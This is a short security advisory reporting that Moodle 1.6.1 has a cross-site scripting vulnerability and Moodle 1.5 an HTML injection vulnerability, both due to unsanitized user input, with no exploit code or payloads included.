Moodle is reported prone to multiple input-validation vulnerabilities, including a cross-site scripting issue and an HTML injection issue, because the application fails to properly sanitize user-supplied input data.

The cross-site scripting vulnerability is reported to affect version 1.6.1; the HTML-injection vulnerability affects version 1.5.
